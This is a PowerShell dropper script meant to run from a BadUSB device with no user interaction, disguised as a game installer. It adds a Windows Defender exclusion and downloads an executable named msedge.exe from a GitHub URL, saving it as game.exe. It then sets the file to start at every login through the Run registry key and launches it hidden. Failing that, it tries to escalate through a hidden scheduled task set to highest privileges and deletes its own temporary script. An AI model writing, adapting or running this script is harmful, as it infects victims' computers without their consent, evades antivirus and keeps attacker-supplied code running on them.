# BadUSB optimized installer script
# This script is designed to be run via BadUSB without requiring user interaction

# Define specific paths for your game
$gameFolder = "$env:USERPROFILE\Documents\MyGame"
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$downloadPath = "$gameFolder\game.exe"
$autoStartName = "MyGame"

# Function to attempt the installation with current privileges
function Install-Game {
    # Create the game directory
    if (!(Test-Path -Path $gameFolder)) {
        try {
            New-Item -ItemType Directory -Path $gameFolder -Force -ErrorAction Stop | Out-Null
        } catch {
            # Continue even if directory creation fails
        }
    }

    # Try to add exclusion if we have permissions
    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderStatus -and $defenderStatus.AntivirusEnabled) {
            Add-MpPreference -ExclusionPath $gameFolder -ErrorAction SilentlyContinue
        }
    } catch {
        # Continue even if adding exclusion fails
    }

    # Download the executable to the game folder
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
    } catch {
        # Try alternative download method if WebRequest fails
        try {
            (New-Object Net.WebClient).DownloadFile($downloadUrl, $downloadPath)
        } catch {
            # If both download methods fail, exit silently
            return $false
        }
    }

    # Add to auto-start
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        if (!(Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`"" -ErrorAction Stop
    } catch {
        # Continue even if adding to startup fails
    }

    # Launch the executable
    try {
        Start-Process -FilePath $downloadPath -ArgumentList "/silent" -WindowStyle Hidden
        return $true
    } catch {
        return $false
    }
}

# Try to request admin privileges silently via scheduled task if not already admin
function Request-AdminPrivileges {
    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        try {
            # Create a temporary script that will run with elevated privileges
            $tempScript = "$env:TEMP\elevate_$((Get-Date).ToString('yyyyMMddHHmmss')).ps1"
            
            # Write the installation script to a temporary file
            $scriptContent = @"
# Define specific paths for your game
`$gameFolder = "$gameFolder"
`$downloadUrl = "$downloadUrl"
`$downloadPath = "`$gameFolder\game.exe"
`$autoStartName = "$autoStartName"

# Create the game directory
if (!(Test-Path -Path `$gameFolder)) {
    New-Item -ItemType Directory -Path `$gameFolder -Force | Out-Null
}

# Add exclusion with admin privileges
try {
    Add-MpPreference -ExclusionPath `$gameFolder
} catch {
    # Continue even if adding exclusion fails
}

# Download the executable if it doesn't exist
if (!(Test-Path -Path `$downloadPath)) {
    try {
        Invoke-WebRequest -Uri `$downloadUrl -OutFile `$downloadPath
    } catch {
        try {
            (New-Object Net.WebClient).DownloadFile(`$downloadUrl, `$downloadPath)
        } catch {
            # If both download methods fail, continue
        }
    }
}

# Add to auto-start
`$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (!(Test-Path `$regPath)) {
    New-Item -Path `$regPath -Force | Out-Null
}
Set-ItemProperty -Path `$regPath -Name `$autoStartName -Value "`"`$downloadPath`""

# Launch the executable
Start-Process -FilePath `$downloadPath -ArgumentList "/silent" -WindowStyle Hidden

# Clean up by deleting this temporary script
Remove-Item -Path "$tempScript" -Force
"@
            
            $scriptContent | Out-File -FilePath $tempScript -Encoding UTF8
            
            # Create a scheduled task that will run with highest privileges
            $taskName = "GameInstall_$((Get-Date).ToString('yyyyMMddHHmmss'))"
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`""
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
            $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
            
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
            
            return $true
        } catch {
            return $false
        }
    }
    
    # Already running as admin
    return $true
}

# Main execution flow - try to install directly first
$installResult = Install-Game

# If direct installation succeeded, we're done
if ($installResult) {
    exit
}

# If direct installation failed, try to get admin privileges via scheduled task
$elevationResult = Request-AdminPrivileges

# Exit silently regardless of result
exit